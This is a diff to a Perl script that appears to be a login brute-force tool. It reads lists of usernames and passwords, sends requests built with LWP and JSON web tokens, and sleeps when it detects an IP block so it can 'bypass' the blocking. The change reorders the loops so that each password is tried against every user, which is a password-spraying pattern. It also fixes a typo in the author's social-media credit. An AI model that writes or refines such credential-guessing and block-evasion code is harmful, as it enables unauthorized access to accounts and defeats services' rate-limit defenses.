@@ -44,10 +44,10 @@ print '
 ';
 print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
 ######################
-foreach $username (@USERS) {
-chomp $username;
-	foreach $password (@PASSS) {
-	chomp $password;
+foreach $password (@PASSS) {
+chomp $password;
+	foreach $username (@USERS) {
+	chomp $username;
 		$casper = LWP::UserAgent->new();
 		$jwt = JSON::WebToken->encode({
 		sub => 'Joe',
@@ -101,14 +101,14 @@ chomp $username;
 		}
 		else
 		{
-			print "\tSorry, your ip [Blocked]\nwait to bypass blocked !... \n";
+			print "\n-----\nSorry, your ip [Blocked]\nwait to bypass blocked !...\n-----\n";
 			sleep(18);
 		}
 	}
 }
 ########################################################
 #
-# Follw Me :-
+# Follow Me :-
 # Twitter: @_1337r00t
 #
 ########################################################
